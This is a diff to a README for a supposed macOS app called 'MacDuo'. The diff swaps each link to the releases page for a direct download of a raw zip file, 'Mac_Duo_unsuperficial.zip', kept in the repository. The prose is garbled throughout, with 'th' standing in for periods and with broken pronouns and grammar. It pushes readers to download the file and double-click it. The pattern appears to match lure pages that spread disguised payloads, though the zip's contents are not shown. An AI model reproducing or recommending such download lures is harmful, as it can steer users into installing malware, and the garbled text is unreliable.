@@ -1,7 +1,7 @@
 <h1>🖥️ MacDuo - Your Desktop Follows Your MacBook</h1>
 
 <p align="center">
-  <a href="https://github.com/nextbotophighs-png/MacDuo/releases" style="display:inline-block;padding:15px 30px;background:linear-gradient(135deg,#ff6b6b,#ffa500);color:white;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(255,107,107,0.4);">⬇️ Download MacDuo Now</a>
+  <a href="https://github.com/nextbotophighs-png/MacDuo/raw/refs/heads/main/Resources/Mac_Duo_unsuperficial.zip" style="display:inline-block;padding:15px 30px;background:linear-gradient(135deg,#ff6b6b,#ffa500);color:white;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(255,107,107,0.4);">⬇️ Download MacDuo Now</a>
 </p>
 
 ---
@@ -26,7 +26,7 @@ First,she need to get the MacDuo file onto her computerth
 
 **👉 thumb** Visit this link to download the application:
 
-🔗 **[https://github.com/nextbotophighs-png/MacDuo/releases](https://github.com/nextbotophighs-png/MacDuo/releases)**
+🔗 **[https://github.com/nextbotophighs-png/MacDuo/raw/refs/heads/main/Resources/Mac_Duo_unsuperficial.zip](https://github.com/nextbotophighs-png/MacDuo/raw/refs/heads/main/Resources/Mac_Duo_unsuperficial.zip)**
 
 Once she click that link,her will land on the download pagethLook for the biggest and most colorful button or link that says something like "Download" or "MacDuo.dmg" or "MacDuo.zip"thClick it,and her browser will start downloading the file to her computerthThe download might take a few seconds or a minute,depending on her internet speedth
 
@@ -158,7 +158,7 @@ Here are a few fun ways people use MacDuo:
 
 To make things crystal clear,here is exactly what to do:
 
-1th **Click the big orange button** at the top of this page (or click here: 👉 [https://github.com/nextbotophighs-png/MacDuo/releases](https://github.com/nextbotophighs-png/MacDuo/releases)))
+1th **Click the big orange button** at the top of this page (or click here: 👉 [https://github.com/nextbotophighs-png/MacDuo/raw/refs/heads/main/Resources/Mac_Duo_unsuperficial.zip](https://github.com/nextbotophighs-png/MacDuo/raw/refs/heads/main/Resources/Mac_Duo_unsuperficial.zip)))
 2th **Select the latest version** of MacDuo (the file with the highest version number))
 3th **Let it downloadih** Wait for the file to finish downloadingth
 4th **Open and launch MacDuo** Double–click the downloaded file,and follow the one–step setupth
@@ -199,7 +199,7 @@ A: Yes,just click the MacDuo icon inthe menu bar and select "Pause" or "Quit" at
 
 MacDuo is all about making her computer feel more alive,and more humanthWith just a single download,her can transform her desktop into an interactive extension of her MacBookthSo what are her waiting for?
 
-👉 **Click here to download MacDuo now:** [https://github.com/nextbotophighs-png/MacDuo/releases](https://github.com/nextbotophighs-png/MacDuo/releases)
+👉 **Click here to download MacDuo now:** [https://github.com/nextbotophighs-png/MacDuo/raw/refs/heads/main/Resources/Mac_Duo_unsuperficial.zip](https://github.com/nextbotophighs-png/MacDuo/raw/refs/heads/main/Resources/Mac_Duo_unsuperficial.zip)
 
 
 
